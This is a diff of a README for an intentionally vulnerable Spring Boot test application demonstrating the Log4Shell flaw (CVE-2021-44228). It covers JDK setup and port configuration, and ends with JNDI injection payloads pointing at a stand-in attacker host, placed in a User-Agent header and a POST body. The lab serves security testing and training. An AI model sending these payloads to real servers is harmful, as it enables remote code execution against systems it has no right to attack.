@@ -1,32 +1,70 @@
-# ITF-log4shell-vulnapp
+# ☕ ITF-log4shell-vulnapp
+
 log4j (CVE-2021-44228) Spring-boot web application with vulnerabilities
-## Installation & Usage
+
+## Installation
+
 ```bash
-# requierd JDK version is 8 or 7 (openJDK 1.8 or 1.7)
+# requierd JDK version 8
 $ git clone https://github.com/Auddn/ITF-log4shell-vulnapp.git
 $ cd ITF-log4shell-vulnapp
 $ ./gradlew build
-$ ./gradlew bootRun
+$ ./gradlew bootJar
 ```
 
-If jdk is not installed in your system, follow:
+If `JDK 8` is not installed in your system, follow:
 
 ```bash
 $ apt-get update
-$ apt-get install openjdk-(8 or 7)-jdk
-$ vi /etc/environment
+$ apt-get install openjdk-8-jdk
+$ vi /etc/profile
 ```
 
 and add `$JAVA_HOME` in vim
 
 ```bash
-$JAVA_HOME="/usr/lib/jvm/java-{version of java(8 or 7)}-openjdk-amd64"
+$JAVA_HOME="/usr/lib/jvm/java-8-openjdk-amd64"
 ```
 
-apply and check the JAVA_HOME environmental variable.
+apply and check the `JAVA_HOME` environmental variable.
 
 ```bash
 $ source /etc/environment
 $ echo $JAVA_HOME
-/usr/lib/jvm/java-{version of java(8 or 7)}-openjdk-amd64
+/usr/lib/jvm/java-8-openjdk-amd64
+```
+
+## Usage
+
+This web application operates based on the Spring-Boot framework and has Tomcat built-in.
+
+If you have successfully completed the installation process, run the application through the following process:
+
+```bash
+$ cd ITF-log4shell-vulnapp/build/libs
+$ java -jar log4shellVulnapp-0.0.1-SNAPSHOT.jar
+```
+
+If you want to change a port of application, you can change a port by edit application.properties
+
+```bash
+$ cd ITF-log4shell-vulnapp/src/main/resources
+$ vi application.properties
+```
+
+and add or edit port setting (default port number is 8080):
+
+```bash
+server.port = 8080
+```
+
+In order to test for log4j vulnerabilities in this application, the payload must be inserted as follows:
+
+```bash
+/GET
+User-Agent: ${jndi:ldap://attack.er/path}
+
+/POST
+(body part)
+payload=${jndi:ldap://attack.er/path}
 ```
